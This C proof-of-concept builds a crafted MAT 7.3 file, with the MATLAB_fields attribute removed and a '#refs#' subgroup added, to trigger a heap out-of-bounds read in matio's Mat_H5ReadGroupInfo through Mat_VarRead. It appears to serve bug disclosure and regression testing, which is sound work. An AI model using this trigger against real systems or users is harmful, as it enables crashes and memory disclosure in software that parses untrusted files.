/*
 * PoC: heap out-of-bounds read in Mat_H5ReadGroupInfo (src/mat73.c) reached
 * through the public API Mat_Open + Mat_VarRead.
 *
 * The file built below contains a scalar struct variable "s" whose group does
 * not carry the MATLAB_fields attribute, so the field names have to be
 * enumerated from the group links with H5Literate. Besides the two field
 * datasets the group also holds a "#refs#" subgroup, i.e. a link the field
 * enumerator skips. The field count used to drive the per-field data loop is
 * taken from the total number of group links instead of the number of
 * enumerated fields, so the loop indexes past the end of the fieldnames array.
 *
 * Expected: AddressSanitizer heap-buffer-overflow READ of size 8 in
 * Mat_H5ReadGroupInfo while Mat_VarRead reads variable "s".
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <hdf5.h>
#include "matio.h"

#define POC_FILE "/tmp/matio_poc_struct_nofields.mat"

static int
write_struct_file(const char *path)
{
    mat_t *mat;
    matvar_t *st, *field;
    const char *fieldnames[] = {"aa", "bb", NULL};
    const double values[] = {11.0, 22.0};
    size_t dims[2] = {1, 1};
    int err;

    mat = Mat_CreateVer(path, NULL, MAT_FT_MAT73);
    if ( NULL == mat )
        return -1;

    st = Mat_VarCreateStruct2("s", 2, dims, fieldnames);
    if ( NULL == st ) {
        Mat_Close(mat);
        return -1;
    }
    for ( int k = 0; k < 2; k++ ) {
        field = Mat_VarCreate(NULL, MAT_C_DOUBLE, MAT_T_DOUBLE, 2, dims, &values[k], 0);
        Mat_VarSetStructFieldByName(st, fieldnames[k], 0, field);
    }
    err = Mat_VarWrite(mat, st, MAT_COMPRESSION_NONE);
    Mat_VarFree(st);
    Mat_Close(mat);
    return err;
}

static int
rework_struct_group(const char *path)
{
    hid_t file_id, group_id;

    file_id = H5Fopen(path, H5F_ACC_RDWR, H5P_DEFAULT);
    if ( file_id < 0 )
        return -1;
    group_id = H5Gopen(file_id, "s", H5P_DEFAULT);
    if ( group_id < 0 ) {
        H5Fclose(file_id);
        return -1;
    }

    /* Drop MATLAB_fields so the fields must be enumerated from the links */
    if ( H5Adelete(group_id, "MATLAB_fields") < 0 ) {
        H5Gclose(group_id);
        H5Fclose(file_id);
        return -1;
    }

    /* A "#refs#" subgroup inside the struct group: skipped by the field
     * enumerator, yet still counted by H5Gget_info */
    {
        hid_t refs_id = H5Gcreate(group_id, "#refs#", H5P_DEFAULT, H5P_DEFAULT, H5P_DEFAULT);
        if ( refs_id < 0 ) {
            H5Gclose(group_id);
            H5Fclose(file_id);
            return -1;
        }
        H5Gclose(refs_id);
    }

    H5Gclose(group_id);
    H5Fclose(file_id);
    return 0;
}

int
main(void)
{
    mat_t *mat;
    matvar_t *st;

    if ( write_struct_file(POC_FILE) ) {
        fprintf(stderr, "failed to write %s\n", POC_FILE);
        return 1;
    }
    if ( rework_struct_group(POC_FILE) ) {
        fprintf(stderr, "failed to rework %s\n", POC_FILE);
        return 1;
    }

    mat = Mat_Open(POC_FILE, MAT_ACC_RDONLY);
    if ( NULL == mat ) {
        fprintf(stderr, "Mat_Open failed\n");
        return 1;
    }

    st = Mat_VarRead(mat, "s");
    if ( NULL != st ) {
        printf("read struct with %u fields\n", Mat_VarGetNumberOfFields(st));
        Mat_VarFree(st);
    }
    Mat_Close(mat);
    return 0;
}
